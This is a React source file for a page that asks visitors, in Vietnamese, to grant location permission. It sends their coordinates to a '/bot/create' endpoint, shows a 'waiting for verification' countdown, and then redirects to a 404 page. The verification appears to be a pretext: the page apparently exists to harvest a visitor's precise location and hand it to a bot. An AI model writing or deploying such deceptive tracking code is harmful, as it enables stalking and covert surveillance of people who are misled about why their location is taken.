import React, { useEffect, useState } from 'react';
import axios from "axios";
import { useNavigate } from "react-router-dom";

const LocationComponent = () => {
  const navigate = useNavigate();
  const [location, setLocation] = useState<any>();
  const [countdown, setCountdown] = useState<number>(10);

  useEffect(() => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude } = position.coords;
          setLocation({ lat: latitude, lng: longitude });
        },
        (error) => {
          console.error('Error getting location:', error);
        }
      );
    } else {
      console.error('Geolocation is not supported by this browser.');
    }
  }, []);

  useEffect(() => {
    if (location) {
      axios.post(`http://localhost:3003/bot/create`, { latitude: location.lat, longitude: location.lng });
    }
  }, [location]);

  useEffect(() => {
    const countdownTimer = setInterval(() => {
      setCountdown((prevCountdown) => {
        if (prevCountdown > 0) {
          return prevCountdown - 1;
        } else {
          clearInterval(countdownTimer);
          return prevCountdown;
        }
      });
    }, 1000);

    return () => {
      clearInterval(countdownTimer);
    };
  }, []);

  const formatTime = (time: number): string => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;

    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes.toString();
    const formattedSeconds = seconds < 10 ? `0${seconds}` : seconds.toString();

    if (minutes === 0 && seconds === 0){
      navigate('/404');
    }

    return `${formattedMinutes}:${formattedSeconds}`;
  };

  return (
    <div>
      {!location ?
        (
          <div>
            <p>Vui lòng cấp quyền vị trí cho app</p>
            <p>Loading...</p>
          </div>
        ) :
        (
          <p>Chờ xác minh: {formatTime(countdown)}</p>
        )}
    </div>
  );
};

export default LocationComponent;
